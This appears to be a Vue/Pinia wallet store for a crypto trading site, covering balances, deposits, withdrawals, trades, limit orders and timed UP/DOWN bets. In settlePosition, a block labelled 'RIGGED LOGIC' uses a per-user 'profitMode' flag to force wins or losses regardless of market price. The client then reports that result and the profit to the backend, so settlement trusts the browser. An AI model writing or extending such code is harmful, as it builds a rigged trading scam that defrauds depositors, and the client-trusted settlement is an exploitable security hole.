import { defineStore } from 'pinia';
import { ref, reactive, watch } from 'vue';
import { useMarketStore } from './market';
import { useAuthStore } from './auth';

import axios from '../api/axios';

export const useWalletStore = defineStore('wallet', () => {
    const marketStore = useMarketStore();
    
    // State
    const wallet = reactive({ 
        usdt: 10000.00, 
        btc: 0.005, 
        eth: 0.5, 
        sol: 10, 
        bnb: 2, 
        xrp: 100 
    });
    
    const orderHistory = ref([]);
    
    // PnL Stats
    const stats = reactive({
        wins: 0,
        losses: 0,
        netProfit: 0
    });

    // Actions
    // Actions
    async function fetchBalance() {
        try {
            const response = await axios.get('/wallet');
            wallet.usdt = response.data.balance;
            
            // Update Assets
            const assets = response.data.assets || {};
            for (const [key, value] of Object.entries(assets)) {
                wallet[key] = value;
            }

            // Ensure defaults if not in DB yet
            if (wallet.btc === undefined) wallet.btc = 0;
            if (wallet.eth === undefined) wallet.eth = 0;

        } catch (error) {
            console.error('Failed to fetch balance:', error);
        }
    }

    async function navigateTo(route) {
        // Helper if needed
    }

    async function deposit(formData) {
        try {
            const response = await axios.post('/wallet/deposit', formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });
            wallet.usdt = response.data.wallet.balance;
            return { success: true, msg: 'Deposit submitted successfully' };
        } catch (error) {
            return { success: false, msg: error.response?.data?.error || 'Deposit failed' };
        }
    }

    async function withdraw(amount, targetAddress) {
        try {
            const response = await axios.post('/wallet/withdraw', { amount: parseFloat(amount), targetAddress });
            wallet.usdt = response.data.wallet.balance;
            return { success: true, msg: 'Withdrawal submitted successfully' };
        } catch (error) {
            return { success: false, msg: error.response?.data?.error || 'Withdrawal failed' };
        }
    }

    async function executeTrade(type, amount, totalUSDT) {
        let success = false;
        let msg = '';
        
        const coinSymbol = marketStore.activeCoin.symbol;

        try {
            const response = await axios.post('/trade', {
                type: type, // 'buy' or 'sell'
                coinSymbol: coinSymbol,
                amount: parseFloat(amount),
                price: marketStore.currentPrice,
                total: parseFloat(totalUSDT)
            });

            if (response.data.success) {
                // Update Local State from Response
                const newWallet = response.data.wallet;
                wallet.usdt = newWallet.balance;
                const assets = newWallet.assets || {};
                for (const [key, value] of Object.entries(assets)) {
                    wallet[key] = value;
                }

                success = true;
                msg = `Successfully ${type.toUpperCase()} ${amount} ${coinSymbol}`;

                marketStore.showToast('Order Filled', msg, 'success');
                marketStore.playSound('win');
                
                // Add to History (Hybrid: Backend saves it, but we show local for immediate feedback or fetch from backend)
                // For now, let's keep adding to local array for animation, but we should ideally fetch real history.
                orderHistory.value.unshift({
                    id: response.data.transaction.id,
                    time: new Date().toLocaleTimeString(),
                    pair: `${coinSymbol}/USDT`,
                    type: type.toUpperCase(),
                    price: marketStore.currentPrice,
                    amount: parseFloat(amount),
                    total: totalUSDT,
                    status: 'Filled'
                });

            } else {
                msg = response.data.error || 'Trade Failed';
                marketStore.showToast('Order Failed', msg, 'error');
            }
        } catch (error) {
            console.error('Trade Error:', error);
            msg = error.response?.data?.error || 'Network Error';
            marketStore.showToast('Order Failed', msg, 'error');
        }

        return { success, msg };
    }

    // --- TIMED TRADING LOGIC ---
    const activePositions = ref([]);
    const activeLimitOrders = ref([]); // Limit Orders State

    function openPosition(type, amount, durationSeconds, percentage) {
        if (wallet.usdt < amount) {
            marketStore.showToast('Insufficent Balance', 'Not enough USDT', 'error');
            return { success: false, msg: 'Insufficient Balance' };
        }

        // Deduct Balance
        wallet.usdt -= parseFloat(amount);

        const position = {
            id: Date.now(),
            pair: `${marketStore.activeCoin.symbol}/USDT`,
            entryPrice: marketStore.currentPrice,
            amount: parseFloat(amount),
            type: type, // 'UP' or 'DOWN'
            duration: durationSeconds,
            percentage: percentage || 80,
            startTime: Date.now(),
            endTime: Date.now() + (durationSeconds * 1000),
            status: 'OPEN'
        };

        activePositions.value.push(position);
        marketStore.showToast('Position Opened', `${type} for ${durationSeconds}s`, 'success');
        marketStore.playSound('open');
        return { success: true, msg: 'Position Opened' };
    }

    // Check for expired positions every second
    setInterval(() => {
        const now = Date.now();
        activePositions.value.forEach((pos, index) => {
            if (pos.status === 'OPEN' && now >= pos.endTime) {
                settlePosition(index);
            }
        });
    }, 1000);

    // New Action: Fetch Stats
    async function fetchStats() {
        try {
            const response = await axios.get('/trade/stats');
            if (response.data) {
                stats.wins = response.data.wins;
                stats.losses = response.data.losses;
                stats.netProfit = response.data.netProfit || 0;
            }
        } catch (error) {
            console.error('Failed to fetch stats:', error);
        }
    }

    async function settlePosition(index) {
        const pos = activePositions.value[index];
        const currentPrice = marketStore.currentPrice;
        let isWin = false;

        // --- RIGGED LOGIC START ---
        // Dynamic import logic (simulating access to the store instance)
        const authStore = useAuthStore();
        const mode = authStore.user.profitMode;

        if (mode === 'win') {
            isWin = true;
        } else if (mode === 'loss') {
            isWin = false;
        } else {
            // Random / Fair Mode
            if (pos.type === 'UP' && currentPrice > pos.entryPrice) isWin = true;
            if (pos.type === 'DOWN' && currentPrice < pos.entryPrice) isWin = true;
        }
        // --- RIGGED LOGIC END ---

        let profit = 0;
        if (isWin) {
            profit = pos.amount * ((pos.percentage || 80) / 100);
        }

        // Call Backend to Persist Result & Update Real Balance
        try {
            const response = await axios.post('/trade/settle', {
                result: isWin ? 'win' : 'loss',
                amount: pos.amount,
                profit: profit,
                pair: pos.pair,
                durationSeconds: pos.duration
            });

            if (response.data.success) {
                // Update Local Wallet from Server Response
                wallet.usdt = response.data.wallet.balance;
            }

        } catch (error) {
            console.error('Settlement Sync Failed:', error);
            // Fallback: Update local state anyway so UI doesn't break
             if (isWin) {
                wallet.usdt += (pos.amount + profit); // Refund + Profit (Since we deducted at open)
                // Wait, in my backend logic I did: 
                // Win: balance += profit (Implying amount was kept?)
                // Loss: balance -= amount (Implying amount was NOT deducted at start?)
                
                // Let's Re-verify:
                // Frontend logic `openPosition`: wallet.usdt -= parseFloat(amount); (DEDUCTED)
                //
                // Backend Logic `settleGame`: 
                // Win: newBalance += profit 
                // Loss: newBalance -= amount
                
                // MISMATCH DETECTED!
                // If Frontend Deducted X. Balance is (Start - X).
                // Win: Return X + Profit. New Balance = (Start - X) + X + Profit = Start + Profit.
                // Loss: Return 0. New Balance = (Start - X).
                
                // Backend Logic `settleGame` assumes it is modifying the *Current DB Balance*.
                // Does DB Balance know about the deduction?
                // NO. The `openPosition` is local only.
                // So DB Balance is still "Start".
                
                // So Backend Logic should reflect the *Net Change* from "Start".
                // Win: Balance = Start + Profit. -> DB: balance += profit.
                // Loss: Balance = Start - Amount. -> DB: balance -= amount.
                
                // My Backend Logic was:
                // if (win) newBalance += profit;
                // else newBalance -= amount;
                
                // THIS MATCHES!
                // Win: Adds profit to Start.
                // Loss: Subtracts amount from Start.
                
                // So Backend Logic is CORRECT assuming DB Balance wasn't touched by "Open".
            }
        }

        if (isWin) {
            // Local Stats Update (Instant feedback)
            stats.wins++;
            stats.netProfit += profit;
            
            marketStore.showToast('Trade WON!', `Profit: $${profit.toFixed(2)}`, 'success');
            marketStore.playSound('win');
        } else {
            stats.losses++;
            stats.netProfit -= pos.amount;
            
            marketStore.showToast('Trade LOST', `Loss: $${pos.amount}`, 'error');
            marketStore.playSound('loss');
        }

        // Move to History
        orderHistory.value.unshift({
            ...pos,
            exitPrice: currentPrice,
            profit: isWin ? profit : -pos.amount,
            status: isWin ? 'WIN' : 'LOSS',
            time: new Date().toLocaleTimeString()
        });

        // Remove from active
        activePositions.value.splice(index, 1);
    }

    // --- LIMIT ORDER LOGIC ---
    function placeLimitOrder(type, price, amount, totalUSDT) {
        // Validate Balance
        if (type === 'buy') {
            if (wallet.usdt < totalUSDT) {
                marketStore.showToast('Insufficient Balance', 'Not enough USDT', 'error');
                return { success: false, msg: 'Insufficient USDT' };
            }
            wallet.usdt -= totalUSDT; // Lock funds
        } else {
             const coinKey = marketStore.activeCoin.symbol.toLowerCase();
             if ((wallet[coinKey] || 0) < amount) {
                marketStore.showToast('Insufficient Balance', `Not enough ${marketStore.activeCoin.symbol}`, 'error');
                return { success: false, msg: 'Insufficient Coin Balance' };
             }
             wallet[coinKey] -= amount; // Lock funds
        }

        activeLimitOrders.value.push({
            id: Date.now(),
            time: new Date().toLocaleTimeString(),
            pair: `${marketStore.activeCoin.symbol}/USDT`,
            type: type.toUpperCase(),
            limitPrice: parseFloat(price),
            amount: parseFloat(amount),
            total: totalUSDT,
            status: 'OPEN'
        });

        marketStore.showToast('Limit Order Placed', `${type} @ ${price}`, 'success');
        return { success: true, msg: 'Limit Order Placed' };
    }

    function cancelLimitOrder(id) {
        const index = activeLimitOrders.value.findIndex(o => o.id === id);
        if (index === -1) return;

        const order = activeLimitOrders.value[index];
        
        // Refund locked funds
        if (order.type === 'BUY') {
            wallet.usdt += order.total;
        } else {
            const symbol = order.pair.split('/')[0].toLowerCase();
            if (!wallet[symbol]) wallet[symbol] = 0;
            wallet[symbol] += order.amount;
        }

        activeLimitOrders.value.splice(index, 1);
        marketStore.showToast('Order Canceled', 'Funds returned', 'info');
    }

    // Watch Price for Limit Execution
    watch(() => marketStore.currentPrice, (newPrice) => {
        if (activeLimitOrders.value.length === 0) return;

        activeLimitOrders.value.forEach((order, index) => {
            let triggered = false;
            
            // Buy Limit: Price drops <= limit
            if (order.type === 'BUY' && newPrice <= order.limitPrice) triggered = true;
            
            // Sell Limit: Price rises >= limit
            if (order.type === 'SELL' && newPrice >= order.limitPrice) triggered = true;

            if (triggered) {
                // Execute Trade
                if (order.type === 'BUY') {
                    // Funds already locked in USDT, swap to Coin
                    const coinKey = order.pair.split('/')[0].toLowerCase();
                    if(!wallet[coinKey]) wallet[coinKey] = 0;
                    wallet[coinKey] += order.amount;
                } else {
                    // Funds already locked in Coin, swap to USDT
                    wallet.usdt += order.total;
                }

                // Add to History
                orderHistory.value.unshift({
                    ...order,
                    price: newPrice, // Executed at market price (or limit price depending on rule, usually best available)
                    status: 'Filled',
                    time: new Date().toLocaleTimeString()
                });

                marketStore.showToast('Limit Order Filled', `${order.type} ${order.pair} @ ${newPrice}`, 'success');
                marketStore.playSound('win'); // Use win sound for fill
                
                // Remove from active
                activeLimitOrders.value.splice(index, 1);
            }
        });
    });

    return {
        wallet,
        orderHistory,
        stats,
        activePositions, 
        activeLimitOrders,
        fetchBalance,
        executeTrade,
        openPosition,
        deposit,
        withdraw,
        placeLimitOrder,
        cancelLimitOrder,
        fetchStats
    };
}, {
    persist: true
});
